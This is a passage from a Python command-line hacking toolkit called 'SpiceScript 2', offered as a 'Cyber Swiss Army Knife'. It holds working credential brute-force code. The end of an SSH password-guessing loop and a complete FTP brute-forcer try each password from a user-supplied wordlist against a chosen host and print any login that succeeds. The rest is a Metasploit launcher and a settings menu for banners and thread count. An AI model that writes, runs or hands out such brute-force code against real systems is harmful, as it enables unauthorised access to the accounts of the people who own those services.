									print(f'\r{styleBold}{Fore.RED}{Style.BRIGHT}[x]{Style.RESET_ALL} Tried: {username}@{target}:{password}', flush=True, end='')
								except paramiko.ssh_exception.SSHException:
									time.sleep(10)
								except ConnectionResetError:
									error("Connection Forcibly Closed By Host.\n")
									break
								except paramiko.ssh_exception.NoValidConnectionsError:
									error('Connection on port 22 was refused.\n')
									break
								else:
									print('\n\n')
									success(f"Login Found!\n\n{username}@{target}:{password}")
									break
						input('Press ENTER To Continue.')
						loopbreak()
						break


					if nmenuchoice == '5':
						clear()
						target = str(input(f'HOST FOR FTP {Fore.YELLOW}>>>{Fore.RESET} '))
						clear()
						username = str(input(f'USERNAME {Fore.YELLOW}>>>{Fore.RESET} '))
						clear()
						wordlist = str(input(f'WORDLIST FILE PATH {Fore.YELLOW}>>>{Fore.RESET} '))
						warning("Brute Forcing the FTP credentials for " + str(username) + "@" + str(target) + "...")
						with open(str(wordlist), 'r') as list:
							for line in list:
								try:
									password = line.strip()
									ftp = ftplib.FTP(target)
									ftp.login(str(username), str(password))
									ftp.quit()
								except ftplib.error_perm:
									print(f'\r' + ' ' * 50, flush=True, end='')
									print(f'\r{styleBold}{Fore.RED}{Style.BRIGHT}[x]{Style.RESET_ALL} Tried: {username}@{target}:{password}', flush=True, end='')
								except ConnectionRefusedError:
									error(f'Connection was refused.')
									break
								except OSError:
									error(f'No Route to host.')
									break
								else:
									print('\n\n')
									success(f"Login Found!\n\n{username}@{target}:{password}")
									break
						input('Press ENTER To Continue.')
						loopbreak()
						break

					if nmenuchoice == '0':
						loopbreak()
						break


			if menuchoice == '4':
				clear()
				if bannerenabled == True:
					top = random.choice(randomtop)
					bannerstatus = f'{Style.BRIGHT}{Fore.GREEN}ON{Fore.RESET}{Style.RESET_ALL}'
				else:
					top = ''
					bannerstatus = f'{Style.BRIGHT}{Fore.RED}OFF{Fore.RESET}{Style.RESET_ALL}'
				banner = f'''{top}{styleBold}{Fore.YELLOW}                                                    
 _____     _         _____         _     _      ___ 
|   __|___|_|___ ___|   __|___ ___|_|___| |_   |_  |
|__   | . | |  _| -_|__   |  _|  _| | . |  _|  |  _|
|_____|  _|_|___|___|_____|___|_| |_|  _|_|    |___|
      |_|                           |_|              {styleReset}
Your Cyber Swiss Army Knife!			  

Made By {styleBold}{Fore.YELLOW}SpiceSouls{styleReset}
Version {styleBold}{Fore.YELLOW}1.0.0{styleReset}'''
				print(banner)
				exmenu = f'''
{styleBold}-1-{styleReset} Start Metasploit

{styleBold}-0-{styleReset} Return To Menu
'''
				print(exmenu)
				while True:
					
					exmenuchoice = str(input(f'{styleBold}#{styleReset}/Settings '))

					if exmenuchoice == '0':
						loopbreak()
						break
					elif exmenuchoice == '1':
						clear()
						warning('Checking for MSF installation...')
						whichmsf = str(os.popen('which msfconsole').read())
						if whichmsf == '':
							error('No msfconsole installation found.')
							input('Press ENTER To Continue.')
						else:
							success(f'Found MSF installation: {whichmsf[:-1]}, Running...')
							os.system(f'msfconsole')
							sys.exit()
						loopbreak()
						break
			if menuchoice == '5':
				clear()
				if bannerenabled == True:
					top = random.choice(randomtop)
					bannerstatus = f'{Style.BRIGHT}{Fore.GREEN}ON{Fore.RESET}{Style.RESET_ALL}'
				else:
					top = ''
					bannerstatus = f'{Style.BRIGHT}{Fore.RED}OFF{Fore.RESET}{Style.RESET_ALL}'
				banner = f'''{top}{styleBold}{Fore.YELLOW}                                                    
 _____     _         _____         _     _      ___ 
|   __|___|_|___ ___|   __|___ ___|_|___| |_   |_  |
|__   | . | |  _| -_|__   |  _|  _| | . |  _|  |  _|
|_____|  _|_|___|___|_____|___|_| |_|  _|_|    |___|
      |_|                           |_|              {styleReset}
Your Cyber Swiss Army Knife!			  

Made By {styleBold}{Fore.YELLOW}SpiceSouls{styleReset}
Version {styleBold}{Fore.YELLOW}1.0.0{styleReset}'''
				print(banner)
				smenu = f'''
{styleBold}-1-{styleReset} Enable/Disable Banners\t{bannerstatus}
{styleBold}-2-{styleReset} Set Preferred Thread Count\t{str(preferredthreads)}

{styleBold}-0-{styleReset} Return To Menu
'''
				print(smenu)
				while True:
					
					smenuchoice = str(input(f'{styleBold}#{styleReset}/Settings '))

					if smenuchoice == '0':
						loopbreak()
						break

					elif smenuchoice == '1':
						clear()
						warning('Are you sure you want to toggle Banners?')
						sureinput = input(f'\n{Fore.GREEN}Y{Fore.RESET}/{Fore.RED}N{Fore.RESET} {Fore.YELLOW}>>>{Fore.RESET} ').title()
						if sureinput == 'Y':
							pass
						else:
							loopbreak()
							break
						if bannerenabled == True:
							terms = open('cfg.json', 'r')
							cfg = json.loads(terms.read())
							ncfg = cfg
							ncfg['banners'] = "False"
							termsw = open('cfg.json', 'w')
							termsw.write(json.dumps(ncfg))
							terms.close()
							termsw.close()
							bannerenabled = False
							success(f'Banners Set to {styleBold}Off!{styleReset}')
							input('Press ENTER To Continue.')
						else:
							terms = open('cfg.json', 'r')
							cfg = json.loads(terms.read())
							ncfg = cfg
							ncfg['banners'] = "True"
							termsw = open('cfg.json', 'w')
							termsw.write(json.dumps(ncfg))
							terms.close()
							termsw.close()
							bannerenabled = True
							success(f'Banners Set to {styleBold}On!{styleReset}')
							input('Press ENTER To Continue.')
						loopbreak()
						break

					elif smenuchoice == '2':
						clear()
						warning('How many threads would you like to use at a time?')
						threadinput = input(f'THREADS {Fore.YELLOW}>>>{Fore.RESET} ')
						terms = open('cfg.json', 'r')
						cfg = json.loads(terms.read())
						ncfg = cfg
						ncfg['threads'] = str(threadinput)
						termsw = open('cfg.json', 'w')
						termsw.write(json.dumps(ncfg))
						terms.close()
						termsw.close()
						preferredthreads = int(threadinput)
						success(f'Preferred Thread Count Set To {styleBold}{str(threadinput)}!{styleReset}')
						input('Press ENTER To Continue.')
						loopbreak()
						break


	except KeyboardInterrupt:
		clear()
		print(f'{styleBold}Bye Bye! {styleReset}٩(^ᴗ^)')
		sys.exit()
